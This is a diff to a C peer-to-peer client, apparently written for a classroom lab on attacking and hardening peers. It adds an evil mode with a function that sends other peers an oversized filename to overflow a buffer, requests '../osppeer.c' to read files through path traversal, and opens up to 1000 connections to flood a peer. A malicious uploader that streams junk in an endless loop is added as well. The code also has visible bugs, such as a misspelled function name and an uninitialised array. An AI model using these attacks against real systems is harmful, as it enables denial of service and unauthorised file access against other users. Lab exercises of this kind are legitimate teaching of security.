@@ -521,6 +521,114 @@ task_t *start_download(task_t *tracker_task, const char *filename)
 	return t;
 }
 
+//download_evil(t, tracker_task)
+// Three types of attacks. 
+// 1. Buffer overflow for the filename buffer size.
+// 2. Get their peer code to see how it runs to find and exploit bugs
+// 3. Overload the peer with many requests
+
+static void download_evil(task_t* t, task_t *tracker_task)
+{
+	int i = -1;
+	int ret = -1;
+
+	if((t && t->type != TASK_DOWNLOAD) || tracker_task->type != TASK_TRACKER)
+	{
+		exit(-1);
+	}
+
+	
+	if(!t || !t->peer_list)
+	{
+		//No peers - Quit.
+		error("* No peers available for '%s'\n", (t ? t->filename : "that file"));
+		task_free(t);
+		return;
+	}
+	else if (t->peer_list->addr.s_addr == listen_addr.s_addr
+			&& t->peer_list->port == listen_port)
+	{
+		//Skip this peer
+		message("* Skipping peer");
+		goto try_again;
+	}
+
+	//Write GET command to this peer
+	message("Connectiong to %s: %d to attack '%s'\n",
+		inet_ntoa(t->peer_list->addr), t->peer_list->port, t->filename);
+	t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+	if(t->peer_fd == -1) {
+		error("* Could not connect to this peer: %s\n", strerror(errno));
+		goto try_again;
+	}
+
+	int ids[1000];
+	int s_num = 0;
+
+	//ATTACK 1: BUFFER OVERFLOW
+	ids[0] = t->peer_fd;
+	//Badly formated filename
+	strncpy(t->filename, t->disk_filename, FILENAMESIZ - 1);
+	//Same filename 4 times:
+	message("* Asking for a large filename\n");
+	osp2p_writef(t->peer_fd, "GET %s%s%s%s OSP2P\n", 
+		t->filename, t->filename, t->filename, t->filename);
+
+	//While victim is processing the request, we attempt a new one
+
+	//ATTACK 2: TRY TO SEE THEIR PEER CODE
+	t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+	if(t->peer_fd == -1)
+	{
+		error("* Could not connect to the peer: %s\n", strerror(errno));
+		goto try_again;
+	}
+	ids[1] = t->peer_fd;
+	// Try to get some higher level files, or peer code to see how theirs works.
+	osp2p_writef(t->peer_fd, "GET ../osppeer.c OSP2P\n");
+
+	
+	//ATTACK 3: SEND A BUNCH OF REQUESTS
+	//Request the same file as many times as possible until they refuse
+	int j = 2;
+	for(; j < 1000; j++)
+	{
+		ids[j] = open_socket(t->peer_list->addr, t->peer_list->port);
+		if(ids[j] == -1)
+		{
+			//They refused
+			error("* Refused!", strerror(errno));
+			goto try_again;
+		}
+		osp2p_writef(t->peer_fd, "GET cat1.jpg OSP2P\n");
+	}
+
+	//Read the file into the task buffer until it fills up
+	while(1)
+	{
+		ret = read_to_taskbuf(t->peer_fd, t);
+		if (ret == TBUF_ERROR) {
+			error("* Peer read error");
+			goto try_again;
+		}
+		else if(ret == TBUF_END && t->head == t->tail)
+			break;
+	}
+
+
+try_again:
+	//Close connection to attacked peer and try to harm someone else
+	messsage("* Closing connection to attacked peer\n");
+	for(i = 0; i < 1000; i++)
+	{
+		if(ids[i] >= 0)
+			close(ids[i]);
+	}
+
+	task_pop_peer(t);
+	download_evil(t, tracker_task);
+}
+
 
 // task_download(t, tracker_task)
 //	Downloads the file specified by the input task 't' into the current
@@ -722,34 +830,46 @@ static void task_upload(task_t *t)
 	    goto exit;
 	  }
 	
-	t->disk_fd = open(t->filename, O_RDONLY);
-	if (t->disk_fd == -1) {
-		error("* Cannot open file %s", t->filename);
-		goto exit;
-	}
-
-	message("* Transferring file %s\n", t->filename);
-	// Now, read file from disk and write it to the requesting peer.
-	while (1) {
-		int ret = write_from_taskbuf(t->peer_fd, t);
-		if (ret == TBUF_ERROR) {
-			error("* Peer write error");
+	//This section contains the original code
+	if(evil_mode == 0)
+	{
+		t->disk_fd = open(t->filename, O_RDONLY);
+		if (t->disk_fd == -1) {
+			error("* Cannot open file %s", t->filename);
 			goto exit;
 		}
 
-		ret = read_to_taskbuf(t->disk_fd, t);
-		if (ret == TBUF_ERROR) {
-			error("* Disk read error");
-			goto exit;
-		} else if (ret == TBUF_END && t->head == t->tail)
-			/* End of file */
-			break;
+		message("* Transferring file %s\n", t->filename);
+		// Now, read file from disk and write it to the requesting peer.
+		while (1) {
+			int ret = write_from_taskbuf(t->peer_fd, t);
+			if (ret == TBUF_ERROR) {
+				error("* Peer write error");
+				goto exit;
+			}
+
+			ret = read_to_taskbuf(t->disk_fd, t);
+			if (ret == TBUF_ERROR) {
+				error("* Disk read error");
+				goto exit;
+			} else if (ret == TBUF_END && t->head == t->tail)
+				/* End of file */
+				break;
+		}
+	}
+
+	//Exercise 3: Uploader attack
+	
+	if(evil_mode != 0)
+	{
+		while(1)
+			osp2p_writef(t->peer_fd, "Fide, sed qui verificare. ");
 	}
 
 	message("* Upload of %s complete\n", t->filename);
 
     exit:
-	task_free(t);
+		task_free(t);
 }
 
 
@@ -834,6 +954,7 @@ int main(int argc, char *argv[])
 
 	// First, download files named on command line.
 	for (; argc > 1; argc--, argv++)
+	{
 		if ((t = start_download(tracker_task, argv[1])))
 		  {
 		    pid = fork();
@@ -843,6 +964,26 @@ int main(int argc, char *argv[])
 			exit(0);
 		      }
 		  }
+	}
+
+	if(evil_mode != 0)
+	{
+		argv--;
+		strcpy(argv[1], "cat1.jpg");
+		t = start_download(tracker_task, argv[1]);
+		if(t)
+		{
+			pid = fork();
+
+			if(pid == 0)
+			{
+				download_evil(t, tracker_task);
+				_exit(0);
+			}
+		}
+	}
+
+
 	// Then accept connections from other peers and upload files to them!
 	while ((t = task_listen(listen_task)))
 	  {
